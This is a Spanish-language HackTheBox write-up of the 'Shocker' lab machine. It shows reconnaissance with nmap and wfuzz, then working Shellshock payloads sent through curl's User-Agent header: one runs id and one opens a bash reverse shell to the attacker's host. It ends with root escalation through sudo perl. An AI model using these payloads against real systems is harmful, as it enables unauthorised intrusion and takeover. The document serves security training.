---
title: Shocker Writeup - HackTheBox
date: 2024-08-15
categories: [WriteUps, HackTheBox]
tags: [Linux, Easy, HackTheBox]
img_path: /assets/img/htb/shocker/
image: /assets/img/htb/shocker/shocker.png
---

Explotamos una vulnerabilidad Shellshock en un script CGI expuesto en el servidor web, lo que nos permitió ejecutar comandos de forma remota y obtener una Reverse Shell. Luego, utilizamos permisos sudo sin contraseña en el binario `/usr/bin/perl` para escalar privilegios a root y tomar control total de la máquina.

## Reconocimiento
---
Realizamos un escaneo de puertos en la máquina objetivo utilizando `nmap` para identificar los servicios en ejecución.

```bash
nmap -p- --open -sS -Pn -n --min-rate 5000 -vvv 10.10.10.56 -oG allPorts
_______________________________________________________________________
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
```
---
El resultado reporta dos puertos abiertos: **80 (HTTP)** y **2222 (SSH)**. A continuación, realizamos un escaneo más detallado para identificar versiones y posibles vulnerabilidades en los servicios.

```bash
nmap -sCV -p80,2222 10.10.10.56 -oN targeted
_______________________________________________________________________
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumeración
---
Accedemos al sitio web en `http://10.10.10.56` y observamos una imagen con el mensaje "Don't bug me". No hay otros enlaces ni información adicional visible.

![shocker-1](/assets/img/htb/shocker/shocker-1.png)

---
Dado que el sitio no ofrece contenido visible, recurrimos al fuzzing de directorios utilizando `wfuzz` para encontrar rutas ocultas que podrían contener contenido interesante.

```bash
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/
_______________________________________________________________________
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================
000000035:   403        11 L     32 W       294 Ch      "cgi-bin" 
```
---
El resultado revela un directorio llamado `cgi-bin`, lo que indica que el servidor podría estar utilizando scripts CGI para generar contenido dinámico. Accedemos al directorio `cgi-bin`, pero nos encontramos con un error **403 Forbidden**, lo que sugiere que el acceso directo está restringido.

![shocker-2](/assets/img/htb/shocker/shocker-2.png)

---
Dado que **cgi-bin** suele contener scripts CGI que generan contenido dinámico, realizamos un fuzzing adicional en este directorio, buscando archivos con extensiones comunes.

```bash
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
_______________________________________________________________________
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================
000000373:   200        7 L      18 W       119 Ch      "user - sh" 
```
---
Este fuzzing revela un archivo llamado `user.sh`. Probamos el contenido del script `user.sh` con `curl` y observamos que es un script dinámico que muestra información de uptime.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh"
Content-Type: text/plain
Just an uptime test script
 10:51:57 up  1:36,  0 users,  load average: 0.00, 0.00, 0.00
_______________________________________________________________________
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh"
Content-Type: text/plain
Just an uptime test script
 10:52:03 up  1:36,  0 users,  load average: 0.00, 0.00, 0.00
```
## Explotación
---
Al tratarse de un script CGI en un servidor vulnerable, surge la posibilidad de que este sistema sea vulnerable a Shellshock, una vulnerabilidad crítica en Bash que permite la ejecución remota de comandos. Realizamos una búsqueda sobre la explotación manual de Shellshock y encontramos esta [Guía de vulnerabilidad](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock).

![shocker-3](/assets/img/htb/shocker/shocker-3.png)

---
Para confirmar la vulnerabilidad, ejecutamos un script de `nmap` diseñado para detectar Shellshock. Podemos verificar si el servidor es vulnerable utilizando el script NSE `http-shellshock` de `nmap`.

```bash
nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh -p80 10.10.10.56
_______________________________________________________________________
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
```
---
Confirmamos que el servidor es vulnerable, por lo que procedemos a realizar un ataque de prueba utilizando `curl`. Procedemos a explotar la vulnerabilidad inyectando un comando para verificar si podemos ejecutar código arbitrario en el servidor.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H 'User-Agent: () { :; }; echo ; echo ; /usr/bin/id'
_______________________________________________________________________
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```
---
La respuesta muestra que el comando se ejecutó con éxito, devolviendo la información del usuario `shelly`. Para obtener una shell interactiva, configuramos un listener en nuestra máquina atacante en el puerto 443 con `netcat`.

```bash
nc -lvnp 443
_______________________________________________________________________
listening on [any] 443 ...
```
---
Luego, enviamos una reverse shell utilizando la vulnerabilidad Shellshock.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.16.9/443 0>&1'
```
---
Conseguimos acceso a la máquina como el usuario `shelly`, el mismo que vimos antes.

```bash
nc -lvnp 443
listening on [any] 443 ...
_______________________________________________________________________
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.56] 50954
shelly@Shocker:/usr/lib/cgi-bin$ 
```
---
Realizamos un tratamiento de la TTY para poder trabajar cómodamente en la consola.

```bash
script /dev/null -c bash
# Presionamos "Control + Z"
stty raw -echo; fg
reset xterm
export TERM=xterm SHELL=bash
stty rows 25 columns 127
```
## Escalada de Privilegios
---
Con el acceso obtenido, leemos la flag de `user.txt`.

```bash
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
_______________________________________________________________________
2bc1e008c552ce******************
```
---
Para escalar privilegios a `root`, listamos los comandos que el usuario `shelly` puede ejecutar con privilegios elevados.

```bash
shelly@Shocker:~$ sudo -l
_______________________________________________________________________
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
---
Podemos ejecutar el binario `/usr/bin/perl` como root sin necesidad de proporcionar contraseña. Consultando [GTFObins](https://gtfobins.github.io/gtfobins/perl/#sudo), encontramos una forma de obtener una shell como root.

```bash
shelly@Shocker:~$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
_______________________________________________________________________
root@Shocker:/# 
```
---
Finalmente, como `root`, accedemos a la flag de `root.txt`.

```bash
root@Shocker:/# cat root/root.txt
_______________________________________________________________________
88d58e9e0c360b******************
```